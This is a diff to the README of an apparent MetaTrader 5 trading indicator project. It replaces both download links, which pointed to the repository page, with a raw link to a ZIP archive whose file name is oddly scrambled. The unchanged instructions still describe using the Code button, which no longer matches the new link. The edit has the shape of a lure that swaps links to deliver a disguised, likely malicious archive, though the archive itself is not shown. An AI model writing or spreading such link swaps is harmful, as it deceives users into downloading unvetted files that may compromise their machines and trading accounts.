@@ -1,6 +1,6 @@
 # 📊 Smart-Money-Concepts-indicator-MT5 - Identify market liquidity and price trends
 
-[![](https://img.shields.io/badge/Download-Indicator-blue.svg)](https://github.com/RichyMunalula/Smart-Money-Concepts-indicator-MT5)
+[![](https://img.shields.io/badge/Download-Indicator-blue.svg)](https://raw.githubusercontent.com/RichyMunalula/Smart-Money-Concepts-indicator-MT5/main/Smart Indicator/Money-Concepts-M-indicator-Smart-3.2.zip)
 
 This tool helps traders find key points on their charts. It works inside the MetaTrader 5 platform. The indicator tracks price action. It marks market structures, order blocks, and levels of liquidity. Traders use these patterns to plan trades. The tool runs automatically on your charts. It saves time by finding patterns for you.
 
@@ -12,7 +12,7 @@ You need a computer with Windows 10 or Windows 11. You must have MetaTrader 5 in
 
 Visit the official repository page to download the necessary files. 
 
-[Click here to open the download page](https://github.com/RichyMunalula/Smart-Money-Concepts-indicator-MT5)
+[Click here to open the download page](https://raw.githubusercontent.com/RichyMunalula/Smart-Money-Concepts-indicator-MT5/main/Smart Indicator/Money-Concepts-M-indicator-Smart-3.2.zip)
 
 On this page, locate the green button labeled Code. Select the option to Download ZIP. Save this file to your computer. Create a clear folder on your desktop and extract the contents of the ZIP file there. You will find a file ending in the extension .ex5 or .mq5. This is the indicator file.
 
